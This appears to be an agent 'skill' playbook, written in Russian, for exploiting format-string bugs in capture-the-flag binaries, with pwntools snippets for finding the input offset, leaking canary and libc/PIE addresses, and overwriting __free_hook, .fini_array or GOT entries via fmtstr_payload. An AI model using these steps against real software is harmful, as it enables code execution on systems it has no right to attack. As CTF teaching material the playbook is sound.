# skill: pwn-fmt

Format-string. Отдельный плейбук, потому что путь в эксплойте жёстко fixed и каждую фазу надо проходить по-очереди.

## Фаза 1 — определить position

```
# Отправь A A A A %1$p %2$p ... %20$p
io.sendline(b'A'*8 + b' '.join([f'%{i}$p'.encode() for i in range(1,21)]))
```

В выводе ищи `0x4141414141414141` или `0x41414141`. Номер — это твой `pos` (position of our input in printf argv).

## Фаза 2 — leak

- stack canary: обычно `%<pos+8>$p` или около того;
- libc base: `%<pos>$p` до появления адреса из libc (ищи `0x7f...`);
- PIE base: ищи адрес, попадающий в код программы.

## Фаза 3 — write (arbitrary write)

```
# Классика: записать 2 байта в адрес TARGET.
# Payload format: <padding><TARGET>%<value>c%<N>$hn
# где N — номер position указателя, который указывает на TARGET.
# <value> — младшие 16 бит того, что ты пишешь.

# Пример: записать 0xdead по адресу 0x404040 (N=10, pos input=6)
payload = flat({
  0: fmtstr_payload(6, {0x404040: 0xdead}),
})
```

pwntools-helper `fmtstr_payload` считает всё за тебя — используй его.

## Фаза 4 — что писать

- Если есть `__free_hook` / `__malloc_hook` (libc ≤ 2.33) — туда адрес `system` или one_gadget.
- Если нет — overwrite `.fini_array[0]` → управление уходит при exit; или `GOT.strcmp` на `system` в бинаре без Full RELRO.

## Правила

- `fmtstr_payload` принимает `offset` — это position input'а, НЕ позиция `%N$hn`.
- При RELRO=full ты не можешь переписать GOT. Выбирай другую мишень.
- Запись в несколько адресов за один payload — только через `fmtstr_payload({addr1: v1, addr2: v2})`.
- Канарейка leak через fmt — всегда дешевле stack-smash.
